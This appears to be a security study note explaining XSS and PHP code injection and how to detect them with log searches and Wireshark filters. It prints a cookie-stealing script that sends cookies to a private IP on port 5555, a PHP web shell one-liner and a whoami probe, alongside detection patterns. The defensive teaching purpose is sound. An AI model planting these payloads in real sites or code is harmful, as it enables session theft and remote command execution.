## Cross-Site Scripting (XSS) & Code Injection Detection

### 1. Understanding Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious scripts (usually JavaScript) into a trusted website. Unlike many other attacks that target the server directly, XSS primarily targets the **users** of the website.

The website acts as a **delivery vehicle** for the attack. Because the script comes from a site the user trusts, the browser has no way to know the script is malicious and will execute it. This allows attackers to bypass the Same-Origin Policy and may enable them to:

- Read cookies or local/session storage
- Capture keystrokes
- Steal session tokens
- Redirect the user to a phishing or malicious site

---

### 2. Scenario: Suspicious Internal Traffic

If you notice that a significant number of requests are being sent to an internal server that you do not recognize, this may indicate the presence of **cross-site scripting** or other client-side injection.

---

### 3. Types of Injection

#### 3.1 Client-Side Injection (XSS)

Attackers commonly use XSS to steal tokens, cookies, and other session values. For example, if the injection is placed in a comment field, the injected payload might look like:

```html
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```

This script:

- Waits for the page to load.
- Reads `document.cookie`.
- Sends the cookie contents to `192.168.0.19` over port `5555`.

#### 3.2 Server-Side Injection (PHP)

Attackers may also attempt to inject **server-side** code, such as PHP, to gain direct control over the web server and achieve Remote Code Execution (RCE).

Examples:

```php
<?php system($_GET['cmd']); ?>
```

- **Purpose**: Command and Control (C2)
- Effect: The attacker can run arbitrary system commands by supplying `?cmd=<command>` in the URL.

```php
<?php echo shell_exec('whoami'); ?>
```

- **Purpose**: Information gathering
- Effect: Reveals which user account the web server is running under.

---

### 4. How to Detect These Attacks

Detection requires looking at both:

- The **Inbound request** (the injection itself)
- The **Outbound behavior** (data exfiltration or callbacks)

#### 4.1 Detecting the Injection (Inbound)

- **Log Analysis**
  - Search web access logs for suspicious patterns such as `<script>` tags or dangerous functions like `system(`, `eval(`, or `whoami`.

  ```bash
  grep -E "(<script|system\(|eval\(|whoami)" access.log
  ```

- **Wireshark Inspection**
  - Look for suspicious characters in HTTP URIs or POST bodies that indicate HTML/JS or PHP injection.

  Example filter:

  ```text
  http.request.uri contains "<script>" or http.request.uri contains "php"
  ```

#### 4.2 Detecting the Impact (Outbound)

- **Unusual Destinations**
  - Look for HTTP requests **originating from your network** (or users) going to unknown IP addresses or strange ports, such as port `5555`.

- **Data in URLs**
  - In Wireshark, inspect GET parameters that look like encoded cookies or session IDs.

  Example filter:

  ```text
  http.request.uri contains "cookie=" or http.request.uri contains "session="
  ```

- **Referer Header**
  - If a user’s browser is sending data out to an attacker’s server, the `Referer` header of that outbound request will often point back to your own website, revealing the original compromised page.


